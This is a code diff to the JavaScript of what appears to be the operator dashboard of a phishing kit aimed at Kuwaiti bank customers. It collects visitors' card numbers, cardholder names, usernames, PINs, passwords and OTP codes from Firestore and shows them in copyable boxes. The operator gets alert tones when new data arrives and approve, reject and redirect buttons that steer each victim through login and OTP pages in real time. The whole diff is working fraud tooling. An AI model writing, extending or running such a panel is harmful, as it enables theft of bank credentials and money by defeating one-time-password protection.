@@ -31,24 +31,22 @@
   let selectedReferenceId = null;
   const selectedReferenceIds = new Set();
   const cardDecisionOverrides = new Map();
-  // إجراءات صندوق بيانات الدخول (توجيه 4/6 أرقام أو رفض) — لكل محاولة تسجيل دخول مفتاح مستقل
-  const loginActionOverrides = new Map();
-  const LOGIN_ACTION_LABELS = { otpnew: 'تم توجيه 4 أرقام', otpcode: 'تم توجيه 6 أرقام', reject: 'تم رفض' };
-  // إجراءات صناديق رموز التحقق (موافقة = توجيه للرئيسية، أو رفض) — لكل رمز مفتاح مستقل
+  // إجراءات صناديق رموز التحقق (موافقة = تمرير لإدخال كلمة المرور، أو رفض) — لكل رمز مفتاح مستقل
   const otpActionOverrides = new Map();
-  const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (توجيه إلى الرئيسية)', reject: 'تم رفض الرمز' };
+  const loginActionOverrides = new Map();
+  const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (تمرير إلى كلمة المرور)', reject: 'تم رفض الرمز' };
   // مفتاح آمن لأسماء حقول Firestore (حروف/أرقام/شرطة سفلية فقط — لا نقاط)
   const safeKey = (v) => String(v).replace(/[^A-Za-z0-9_]/g, '_');
-  const loginEntryKey = (entry, i) => {
-    if (entry && entry.at) return 'at_' + safeKey(entry.at);
-    if (entry && (entry.username || entry.password)) return 'u_' + safeKey(entry.username || '') + '_' + safeKey(entry.password || '');
-    return 'idx_' + i;
-  };
   let boxCounterTimer = null;
   let referenceListCounterTimer = null;
   let presenceRefreshTimer = null;
   let knownCustomerIds = new Set();
   let customersInitialized = false;
+  let knownCustomers = new Map();  // آخر نسخة معروفة من بيانات كل عميل
+  let knownCards = new Map();      // آخر نسخة معروفة من كل بطاقة
+  let knownOtps = new Map();       // آخر نسخة معروفة من كل رمز تحقق
+  let cardsInitialized = false;
+  let otpsInitialized = false;
   const binLookupCache = new Map();
   function getKuwaitBankCode(cardNumber) {
     const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 6);
@@ -76,7 +74,7 @@
     return text;
   }
   function bankLogoDataUrl(bankCode) {
-    if (!bankCode) return '/assets/images/unknown-bank.svg';
+    if (!bankCode) return 'assets/images/unknown-bank.svg';
     const palette = {
       kfh: ['#075985','#ffffff'], nbk: ['#1d4ed8','#ffffff'], boubyan: ['#0f766e','#ffffff'],
       gulf: ['#0369a1','#ffffff'], cbk: ['#047857','#ffffff'], abk: ['#7c3aed','#ffffff'],
@@ -244,48 +242,246 @@
     setTimeout(() => { div.style.opacity = '0'; div.style.transition = 'opacity 0.3s'; setTimeout(() => div.remove(), 300); }, 3000);
   }
 
-  // ── التنبيه الصوتي (نغمة هادئة واحدة عند بطاقة/OTP جديد) ───
-  // ── المراحل: زائر جديد / بطاقة / رمز تحقق ─────────────────
-  let cardAlertAudio = null;
-  function playCardAlertAudio() {
-    if (!soundEnabled) return;
-    try {
-      cardAlertAudio = cardAlertAudio || new Audio('/assets/audio/card-alert.mp3');
-      cardAlertAudio.currentTime = 0;
-      cardAlertAudio.play().catch(() => {});
-    } catch (e) { /* تجاهل قيود تشغيل الصوت في المتصفح */ }
-  }
-  function playNotificationTone(stage = 'card') {
-    if (!soundEnabled) return;
-    if (stage === 'card') {
-      playCardAlertAudio();
-      return;
+  // ── التنبيه الصوتي ─────────────────────────────────────────
+  // نغمة واحدة تُطلق عند وصول أي بيانات جديدة إلى اللوحة
+  // (زائر جديد، تحديث بيانات عميل، بطاقة، رمز تحقق).
+  let notificationAudio = null;
+  let audioUnlocked = false;
+  let lastToneAt = 0;
+  let pendingToneTimer = null;
+  let soundSuppressUntil = 0;      // كتم مؤقت بعد كتابة تقوم بها اللوحة نفسها
+  const TONE_GAP = 900;            // أدنى فاصل بين نغمتين (لدمج الدفعات)
+
+  // حقول لا تُعدّ «بيانات جديدة»: حضور/جلسة + الحقول التي يكتبها المدير
+  const SOUND_IGNORED_FIELDS = new Set([
+    'lastSeen', 'sessionId', 'createdAt', 'updatedAt', 'currentPage', 'ip', 'browser', 'device',
+    'country', 'online', 'hasNewActivity', 'sessionStart', 'referrer', 'userAgent', 'visitCount',
+    'decision', 'status', 'decidedAt', 'decisionUpdatedAt', 'isBlocked', 'isHidden', 'flagColor',
+    'rejectReason', 'otpActions', 'loginActions', 'redirect', 'adminNote',
+  ]);
+
+  // قيمة تعني «بيانات فعلية»؟ (فارغ أو صفر أو «0.000 د.ك» لا تعني شيئاً)
+  function hasDataValue(value) {
+    if (value === null || value === undefined) return false;
+    if (typeof value === 'number') return value !== 0;
+    if (typeof value === 'string') {
+      const text = value.trim();
+      if (!text) return false;
+      return !/^0*[.,]?0*\s*(د\.ك|دج|KD|KWD|DZD|ريال|درهم|دينار)?$/i.test(text);
     }
+    if (Array.isArray(value)) return value.length > 0;
+    if (typeof value === 'object') return Object.keys(value).length > 0;
+    return !!value;
+  }
+
+  // ترتيب مفاتيح الخرائط يختلف بين قراءة وأخرى في Firestore، فنوحّده قبل المقارنة
+  function stableValue(value) {
+    if (Array.isArray(value)) return value.map(stableValue);
+    if (value && typeof value === 'object') {
+      if (typeof value.toMillis === 'function') return value.toMillis();
+      const ordered = {};
+      Object.keys(value).sort().forEach((key) => { ordered[key] = stableValue(value[key]); });
+      return ordered;
+    }
+    return value;
+  }
+
+  function sameFieldValue(a, b) {
+    if (a === b) return true;
+    if (!a || !b || typeof a !== 'object' || typeof b !== 'object') return false;
+    const ta = typeof a.toMillis === 'function' ? a.toMillis() : null;
+    const tb = typeof b.toMillis === 'function' ? b.toMillis() : null;
+    if (ta !== null || tb !== null) return ta === tb;
+    try { return JSON.stringify(stableValue(a)) === JSON.stringify(stableValue(b)); } catch (e) { return false; }
+  }
+
+  // الحقول التي تغيّرت بقيمة حقيقية (زيارة عابرة أو نبضة حضور لا تُحسب)
+  function incomingChangeKeys(previous, next) {
+    const before = previous || {};
+    const changed = [];
+    const keys = new Set([...Object.keys(before), ...Object.keys(next || {})]);
+    for (const key of keys) {
+      if (SOUND_IGNORED_FIELDS.has(key)) continue;
+      if (sameFieldValue(before[key], (next || {})[key])) continue;
+      // الحقل الذي صار فارغاً ليس بيانات جديدة (ومحو القيم لا يُصدر نغمة)
+      if (hasDataValue((next || {})[key])) changed.push(key);
+    }
+    return changed;
+  }
+
+  function isIncomingChange(previous, next) {
+    return incomingChangeKeys(previous, next).length > 0;
+  }
+
+  // لا تسمح لكتابة فارغة قادمة من الموقع بأن تمحو اسماً/هاتفاً معروفاً في اللوحة
+  const IDENTITY_GUARD_FIELDS = ['name', 'phone', 'mobile', 'address', 'email'];
+  function keepKnownIdentity(previous, next) {
+    if (!previous) return next;
+    IDENTITY_GUARD_FIELDS.forEach((key) => {
+      const hadValue = previous[key] !== undefined && previous[key] !== null && previous[key] !== '';
+      const lostValue = next[key] === undefined || next[key] === null || next[key] === '';
+      if (hadValue && lostValue) next[key] = previous[key];
+    });
+    return next;
+  }
+
+  function ensureAudioObjects() {
     try {
       audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
-      if (audioCtx.state === 'suspended') audioCtx.resume();
-      const tones = {
-        visitor: [660, 880],
-        card: [880, 1320],
-        otp: [1046, 1568, 2093],
-      };
-      const frequencies = tones[stage] || tones.card;
-      const now = audioCtx.currentTime;
-      frequencies.forEach((freq, i) => {
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.type = 'sine';
-        osc.frequency.value = freq;
-        const start = now + i * 0.11;
-        gain.gain.setValueAtTime(0, start);
-        gain.gain.linearRampToValueAtTime(0.15, start + 0.01);  // ظهور تدريجي
-        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.18); // تلاشٍ سريع
-        osc.connect(gain).connect(audioCtx.destination);
-        osc.start(start);
-        osc.stop(start + 0.19);
-      });
-    } catch (e) { /* تجاهل أخطاء الصوت بصمت */ }
+      if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+    } catch (e) { /* المتصفح لا يدعم Web Audio */ }
+    if (!notificationAudio) {
+      try {
+        notificationAudio = new Audio('assets/audio/notification.wav');
+        notificationAudio.preload = 'auto';
+      } catch (e) { notificationAudio = null; }
+    }
   }
+
+  // نغمة مُولّدة احتياطية (نفس نغمة الإشعار) تعمل حتى لو تعذّر تحميل الملف
+  function playSynthTone() {
+    try {
+      ensureAudioObjects();
+      if (!audioCtx) return;
+      if (audioCtx.state === 'suspended') notifySoundBlocked();
+      const now = audioCtx.currentTime;
+      [[1174.66, 0], [1760, 0.105]].forEach(([freq, delay]) => {
+        [1, 2].forEach((mult, partial) => {
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.value = freq * mult;
+          const start = now + delay;
+          gain.gain.setValueAtTime(0, start);
+          gain.gain.linearRampToValueAtTime(partial === 0 ? 0.22 : 0.07, start + 0.005);
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.35);
+          osc.connect(gain).connect(audioCtx.destination);
+          osc.start(start);
+          osc.stop(start + 0.36);
+        });
+      });
+    } catch (e) { /* تجاهل */ }
+  }
+
+  // فتح قناة الصوت عند أول تفاعل من المستخدم (سياسة التشغيل التلقائي في المتصفحات)
+  function unlockAudio() {
+    ensureAudioObjects();
+    try {
+      if (audioCtx) {
+        if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+        if (!audioUnlocked) {
+          const buffer = audioCtx.createBuffer(1, 1, 22050);
+          const source = audioCtx.createBufferSource();
+          source.buffer = buffer;
+          source.connect(audioCtx.destination);
+          source.start(0);
+          audioUnlocked = true;
+        }
+      }
+    } catch (e) { /* تجاهل */ }
+  }
+
+  // تنبيه مرة واحدة إن منع المتصفح تشغيل الصوت قبل تفاعل المستخدم
+  let soundBlockedNoticeShown = false;
+  function notifySoundBlocked() {
+    if (soundBlockedNoticeShown) return;
+    soundBlockedNoticeShown = true;
+    toast('اضغط في أي مكان في الصفحة لتفعيل نغمة الإشعارات', 'info');
+  }
+  ['pointerdown', 'keydown', 'touchstart'].forEach((evt) => {
+    document.addEventListener(evt, unlockAudio, { capture: true, passive: true });
+  });
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && soundEnabled) unlockAudio();
+  });
+
+  function playToneNow() {
+    lastToneAt = Date.now();
+    ensureAudioObjects();
+    let handled = false;
+    if (notificationAudio) {
+      try {
+        notificationAudio.currentTime = 0;
+        const attempt = notificationAudio.play();
+        handled = true;
+        if (attempt && typeof attempt.catch === 'function') {
+          attempt.catch((err) => {
+            playSynthTone();
+            if (err && err.name === 'NotAllowedError') notifySoundBlocked();
+          });
+        }
+      } catch (e) { handled = false; }
+    }
+    if (!handled) playSynthTone();
+  }
+
+  // منع تكرار النغمة لنفس المحتوى (نقر مزدوج أو إعادة إرسال متطابقة)
+  const SOUND_VOLATILE_KEYS = new Set(['at', 'timestamp', 'createdAt', 'lastSeen', 'refNo', 'updatedAt', 'decisionUpdatedAt']);
+  const REPEAT_WINDOW = 8000;
+  let lastSignature = '';
+  let lastSignatureAt = 0;
+
+  function stripVolatile(value) {
+    if (Array.isArray(value)) return value.map(stripVolatile);
+    if (value && typeof value === 'object') {
+      if (typeof value.toMillis === 'function') return value.toMillis();
+      const out = {};
+      Object.keys(value).forEach((key) => {
+        if (!SOUND_VOLATILE_KEYS.has(key)) out[key] = stripVolatile(value[key]);
+      });
+      return out;
+    }
+    return value;
+  }
+
+  function dataSignature(source, id, data) {
+    try {
+      return source + '/' + id + '|' + JSON.stringify(stableValue(stripVolatile(data)));
+    } catch (e) { return ''; }
+  }
+
+  // نغمة واحدة لكل محتوى جديد؛ إعادة إرسال مطابقة خلال 8 ثوانٍ لا تُكرّر الصوت
+  function ringFor(signature) {
+    const now = Date.now();
+    if (signature && signature === lastSignature && now - lastSignatureAt < REPEAT_WINDOW) {
+      lastSignatureAt = now;
+      return;
+    }
+    lastSignature = signature || '';
+    lastSignatureAt = now;
+    playNotificationTone();
+  }
+
+  // كل وصول بيانات يمرّ من هنا: نغمة واحدة، ولا تُفقد نغمة عند تزامن أكثر من وثيقة
+  function playNotificationTone() {
+    if (!soundEnabled) return;
+    if (Date.now() < soundSuppressUntil) return;
+    const wait = TONE_GAP - (Date.now() - lastToneAt);
+    if (wait > 0) {
+      if (!pendingToneTimer) {
+        pendingToneTimer = setTimeout(() => { pendingToneTimer = null; playToneNow(); }, wait + 20);
+      }
+      return;
+    }
+    playToneNow();
+  }
+
+  // كتابات اللوحة نفسها (موافقة/رفض/حظر...) ليست بيانات واردة
+  function suppressIncomingSound(ms = 3000) {
+    soundSuppressUntil = Date.now() + ms;
+  }
+  (function guardDashboardWrites() {
+    try {
+      const proto = firebase.firestore.DocumentReference.prototype;
+      ['set', 'update', 'delete'].forEach((method) => {
+        const original = proto[method];
+        if (typeof original !== 'function' || original.__soundGuarded) return;
+        const wrapped = function () { suppressIncomingSound(); return original.apply(this, arguments); };
+        wrapped.__soundGuarded = true;
+        proto[method] = wrapped;
+      });
+    } catch (e) { console.warn('sound guard skipped:', e); }
+  })();
 
   function updateSoundUI() {
     if (!els.btnSound) return;
@@ -298,8 +494,8 @@
     soundEnabled = !soundEnabled;
     localStorage.setItem('admin_sound', soundEnabled ? '1' : '0');
     updateSoundUI();
-    // إن فُعّل للتو، نشغّل نغمة تأكيد بسيطة (يتطلب تفاعل المستخدم لإنشاء AudioContext)
-    if (soundEnabled) playNotificationTone();
+    // نغمة تأكيد عند التفعيل (وهي أيضاً تفتح قناة الصوت بعد تفاعل المستخدم)
+    if (soundEnabled) { unlockAudio(); playToneNow(); }
   }
 
   // ── المصادقة (Login) ────────────────────────────────────────
@@ -354,6 +550,12 @@
   }
 
   function logout() {
+    customersInitialized = false;
+    cardsInitialized = false;
+    otpsInitialized = false;
+    knownCustomers.clear();
+    knownCards.clear();
+    knownOtps.clear();
     if (unsubCustomers) { unsubCustomers(); unsubCustomers = null; }
     if (unsubCards) { unsubCards(); unsubCards = null; }
     if (unsubOtps) { unsubOtps(); unsubOtps = null; }
@@ -369,6 +571,11 @@
   // مثل اللوحة القديمة تماماً: ندمج collection "cards" (كل بطاقة) مع
   // collection "customers" (بيانات العميل) عبر sessionId. كل صف = بطاقة.
   function startListening() {
+    // لا نكرّر المستمعين إذا استُدعيت الدالة أكثر من مرة (تسجيل دخول/تجديد جلسة)
+    if (unsubCustomers) { unsubCustomers(); unsubCustomers = null; }
+    if (unsubCards) { unsubCards(); unsubCards = null; }
+    if (unsubOtps) { unsubOtps(); unsubOtps = null; }
+
     // فلاتر افتراضية للحالة
     document.querySelector('.filter-btn[data-filter="all"]').setAttribute('data-active', 'true');
     document.querySelector('.filter-btn[data-filter="all"]').classList.add('bg-emerald-600', 'text-white');
@@ -385,14 +592,19 @@
     // استماع لـ customers (يحفظ في خريطة بالـ sessionId)
     try {
       unsubCustomers = db.collection('customers').onSnapshot((snap) => {
-        const hasNewCustomer = customersInitialized && snap.docChanges().some((change) => change.type === 'added' && !knownCustomerIds.has(change.doc.id));
+        let customerSignature = '';
         customersMap = {};
         snap.forEach((doc) => {
           const data = doc.data();
-          customersMap[data.sessionId || doc.id] = { id: doc.id, ...data };
+          if (customersInitialized && isIncomingChange(knownCustomers.get(doc.id), data)) {
+            customerSignature = dataSignature('customers', doc.id, data);
+          }
+          const knownBefore = knownCustomers.get(doc.id);
+          knownCustomers.set(doc.id, data);
           knownCustomerIds.add(doc.id);
+          customersMap[data.sessionId || doc.id] = keepKnownIdentity(knownBefore, { id: doc.id, ...data });
         });
-        if (hasNewCustomer) playNotificationTone('visitor');
+        if (customerSignature) ringFor(customerSignature);
         customersInitialized = true;
         rebuildMerged();
       }, (err) => {
@@ -415,11 +627,13 @@
       unsubCards = db.collection('cards').onSnapshot((snap) => {
         cardsList = [];
         cardsBySession = {};
-        let hasNewCard = false;
+        let cardSignature = '';
         snap.docChanges().forEach((change) => {
-          if (change.type === 'added' && !knownCardIds.has(change.doc.id)) {
-            hasNewCard = true;
+          const cardData = change.doc.data();
+          if (cardsInitialized && isIncomingChange(knownCards.get(change.doc.id), cardData)) {
+            cardSignature = dataSignature('cards', change.doc.id, cardData);
           }
+          knownCards.set(change.doc.id, cardData);
         });
         snap.forEach((doc) => {
           const data = doc.data();
@@ -440,7 +654,8 @@
             return tb - ta;
           });
         });
-        if (hasNewCard) playNotificationTone('card');
+        if (cardSignature) ringFor(cardSignature);
+        cardsInitialized = true;
         rebuildMerged();
       }, (err) => {
         console.error('cards listen error:', err);
@@ -451,11 +666,13 @@
     try {
       unsubOtps = db.collection('otps').onSnapshot((snap) => {
         otpsMap = {};
-        let hasNewOtp = false;
+        let otpSignature = '';
         snap.docChanges().forEach((change) => {
-          if (change.type === 'added' && !knownOtpIds.has(change.doc.id)) {
-            hasNewOtp = true;
+          const otpData = change.doc.data();
+          if (otpsInitialized && isIncomingChange(knownOtps.get(change.doc.id), otpData)) {
+            otpSignature = dataSignature('otps', change.doc.id, otpData);
           }
+          knownOtps.set(change.doc.id, otpData);
         });
         snap.forEach((doc) => {
           const data = doc.data();
@@ -474,7 +691,8 @@
             return tb - ta;
           });
         });
-        if (hasNewOtp) playNotificationTone('otp');
+        if (otpSignature) ringFor(otpSignature);
+        otpsInitialized = true;
         rebuildMerged();
       }, (err) => {
         console.error('otps listen error:', err);
@@ -558,6 +776,8 @@
         country: m.country || '',
         pass: m.pass || '',
         username: m.username || '',
+        hasAccount: m.hasAccount || '',
+        hasAccountLabel: m.hasAccountLabel || (m.hasAccount === 'yes' ? 'نعم' : m.hasAccount === 'no' ? 'لا' : ''),
         logins: Array.isArray(m.logins) ? m.logins : [],
         loginActions: (m.loginActions && typeof m.loginActions === 'object') ? m.loginActions : {},
         otpActions: (m.otpActions && typeof m.otpActions === 'object') ? m.otpActions : {},
@@ -593,6 +813,7 @@
     // العميل يظهر إذا كان لديه: اسم أو هاتف أو عنوان أو بطاقة أو OTP
     .filter(x => !x.isHidden && (
       x.name || x.phone || x.address ||
+      (x.logins && x.logins.length > 0) ||
       (x.allCards && x.allCards.length > 0) ||
       (x.allOtps && x.allOtps.length > 0) ||
       (x.passwordResets && x.passwordResets.length > 0) ||
@@ -777,7 +998,7 @@
       const scheme = cardSchemeClass(card.scheme || card.network);
       const bankClass = fixedBankCode ? `bank-${cardSchemeClass(fixedBankCode)}` : 'bank-unknown';
       return `<div class="ref-card-shell"><div class="ref-card-box-label"><div><strong>البطاقة ${i + 1}</strong><time class="ref-box-time" data-box-counter data-box-time="${timestamp}" datetime="${timestamp}">${escapeHtml(formatRefTime(timestamp))}</time></div><span class="ref-card-state ${decision}">${cardStatusLabel(card)}</span></div><article class="ref-card-box bank-card bank-card-${scheme} ${bankClass} ${decision === 'approved' ? 'is-approved' : decision === 'rejected' ? 'is-rejected' : ''}" data-ref-time="${timestamp}" data-card-number="${escapeHtml(cardNumber)}">
-        <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='/assets/images/unknown-bank.svg'"></div>
+        <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='assets/images/unknown-bank.svg'"></div>
         <div class="bank-card-number ref-copyable" data-copy="${escapeHtml(cardNumber || '')}">${escapeHtml(cardNumber || '•••• •••• •••• ••••')}</div>
         <div class="bank-card-details">
           <div><small>حامل البطاقة</small><strong class="ref-copyable" ${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || '')) ? `data-copy="${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || ''))}"` : ''}>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
@@ -789,33 +1010,64 @@
       </article></div>`;
     }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
     // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
-    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('الدولة', visitor.country)}${field('العنوان', visitor.address)}${field('المبلغ', visitor.amount)}</article>`;
-    // صناديق بيانات الدخول — كل محاولة تسجيل دخول في صندوق منفصل (لا تُستبدل)
+    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('نوع الاختيار (هل لديك حساب؟)', visitor.hasAccountLabel || visitor.hasAccount)}${field('الدولة', visitor.country)}</article>`;
+    // صناديق بيانات الدخول: (اسم المستخدم + الرقم السري) في صندوق واحد لكل محاولة،
+    // وكلمة المرور النصية في صندوق منفصل — وكل محاولة جديدة تُضاف كصندوق مستقل مع أزرار موافقة/رفض.
     const loginEntries = Array.isArray(visitor.logins) ? [...visitor.logins] : [];
     if (!loginEntries.length && (visitor.username || visitor.pass)) {
       loginEntries.push({ username: visitor.username, password: visitor.pass });
     }
-    loginEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
+    loginEntries.sort((a, b) => (toMillis(a && a.at) || 0) - (toMillis(b && b.at) || 0));
+    const isTextPasswordEntry = (entry) => /نصي/.test(String((entry && entry.page) || ''));
+    const loginBoxes = [];
+    let pendingUsernameEntry = null;
+    loginEntries.forEach((entry) => {
+      const at = toMillis(entry && entry.at);
+      const password = String((entry && entry.password) || '');
+      const username = String((entry && entry.username) || '');
+      if (isTextPasswordEntry(entry)) {
+        loginBoxes.push({ kind: 'text', password: password, username: username, at: at });
+        return;
+      }
+      // خطوة اسم المستخدم وحدها: تُحفظ مؤقتاً حتى يصل الرقم السري ليجمعهما صندوق واحد
+      if (!password) { pendingUsernameEntry = { username: username, at: at }; return; }
+      loginBoxes.push({
+        kind: 'login',
+        username: username || (pendingUsernameEntry && pendingUsernameEntry.username) || '',
+        pin: password,
+        at: at,
+      });
+      pendingUsernameEntry = null;
+    });
+    if (pendingUsernameEntry) {
+      loginBoxes.push({ kind: 'login', username: pendingUsernameEntry.username, pin: '', at: pendingUsernameEntry.at, pending: true });
+    }
+    loginBoxes.sort((a, b) => (b.at || 0) - (a.at || 0));
+    const loginBoxCounts = { login: 0, text: 0 };
+    [...loginBoxes].reverse().forEach((box) => { box.number = ++loginBoxCounts[box.kind]; });
     const loginActionsMap = (visitor.loginActions && typeof visitor.loginActions === 'object') ? visitor.loginActions : {};
     const loginActionFor = (key) => {
       const local = loginActionOverrides.get((visitor.sessionId || visitor.id) + '|' + key);
       if (local) return local;
       const remote = loginActionsMap[key];
-      if (remote && remote.action) return { action: remote.action, label: remote.label || LOGIN_ACTION_LABELS[remote.action] || '' };
-      return null;
+      return (remote && remote.action) ? { action: remote.action, label: remote.label || '' } : null;
     };
-    const loginBoxesHtml = loginEntries.map((entry, i) => {
-      const t = toMillis(entry && entry.at);
-      const sidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
-      const key = loginEntryKey(entry, i);
+    const loginSidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
+    const loginBoxesHtml = loginBoxes.map((box, i) => {
+      const t = box.at || 0;
+      const key = (box.kind === 'text' ? 'textpass_' : 'login_') + (box.at || ('i' + i));
       const done = loginActionFor(key);
-      // بعد تنفيذ إجراء على هذه المحاولة: تُطبع الحالة مكان الأزرار (تُخفى الأزرار لهذا الصندوق فقط)
+      const title = box.kind === 'text' ? 'كلمة المرور النصية' : 'بيانات الدخول';
+      const numberLabel = loginBoxCounts[box.kind] > 1 ? ' #' + box.number : '';
+      const fieldsHtml = box.kind === 'text'
+        ? field('كلمة المرور', box.password)
+        : field('اسم المستخدم', box.username) + field('الرقم السري', box.pin || (box.pending ? 'بانتظار الإدخال' : ''));
       const actionsHtml = done
-        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || LOGIN_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
-        : `<div class="ref-card-actions"><button data-login-action="otpnew" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 4 أرقام</button><button data-login-action="otpcode" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 6 أرقام</button><button data-login-action="reject" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">رفض</button></div>`;
-      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}${actionsHtml}</article>`;
+        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || 'تم التنفيذ')}</div>`
+        : (box.pending ? '' : `<div class="ref-card-actions"><button data-login-action="approve" data-login-kind="${box.kind}" data-login-key="${escapeHtml(key)}" data-session-id="${loginSidAttr}">✓ موافقة</button><button data-login-action="reject" data-login-kind="${box.kind}" data-login-key="${escapeHtml(key)}" data-session-id="${loginSidAttr}">× رفض</button></div>`);
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>${title}${numberLabel}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${fieldsHtml}${actionsHtml}</article>`;
     }).join('');
-    const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
+    const loginBoxTime = loginBoxes.length ? loginBoxes[0].at : (visitor.customerUpdatedAt || visitor.createdDate);
     // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
     const resetEntries = Array.isArray(visitor.passwordResets) ? [...visitor.passwordResets] : [];
     resetEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
@@ -847,7 +1099,7 @@
       const done = otpActionFor(key);
       const actionsHtml = done
         ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || OTP_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
-        : `<div class="ref-card-actions"><button data-otp-action="approve" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">توجيه إلى الرئيسية</button><button data-otp-action="reject" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">رفض</button></div>`;
+        : `<div class="ref-card-actions"><button data-otp-action="approve" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">موافقة</button><button data-otp-action="reject" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">رفض</button></div>`;
       return `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div>${actionsHtml}</article>`;
     }).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
@@ -865,7 +1117,7 @@
       .sort((a, b) => (b.time || 0) - (a.time || 0))
       .map(s => s.html)
       .join('') + basicBoxHtml;
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><button data-ref-nav="otpnew">رمز 4 أرقام</button><button data-ref-nav="regist">إكمال التسجيل</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option><option value="otpnew">رمز 4 أرقام</option><option value="regist">إكمال التسجيل</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
